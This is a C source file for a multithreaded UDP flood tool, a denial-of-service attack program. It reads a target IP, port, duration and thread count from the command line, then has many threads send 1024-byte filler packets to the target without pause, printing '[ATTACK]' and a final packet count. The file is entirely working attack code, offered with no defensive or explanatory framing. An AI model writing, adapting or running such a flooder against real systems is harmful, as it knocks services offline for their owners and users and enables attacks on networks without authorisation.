#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

volatile int attack_active = 1;
unsigned long long total_packets = 0;
char TARGET_IP[16];
int TARGET_PORT;
int THREAD_COUNT = 100;
int DURATION_TIME = 60;

void* send_packets(void* arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr;
    char packet[1024];
    memset(packet, 'X', 1024);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &addr.sin_addr);
    while(attack_active) {
        sendto(sock, packet, 1024, 0, (struct sockaddr*)&addr, sizeof(addr));
        total_packets++;
    }
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc < 4) return 1;
    strcpy(TARGET_IP, argv[1]);
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    if(argc >= 5) THREAD_COUNT = atoi(argv[4]);
    printf("[ATTACK] %s:%d | %ds | %d threads\n", TARGET_IP, TARGET_PORT, DURATION_TIME, THREAD_COUNT);
    pthread_t tids[THREAD_COUNT];
    for(int i = 0; i < THREAD_COUNT; i++) pthread_create(&tids[i], NULL, send_packets, NULL);
    sleep(DURATION_TIME);
    attack_active = 0;
    for(int i = 0; i < THREAD_COUNT; i++) pthread_join(tids[i], NULL);
    printf("[DONE] Packets: %llu\n", total_packets);
    return 0;
}
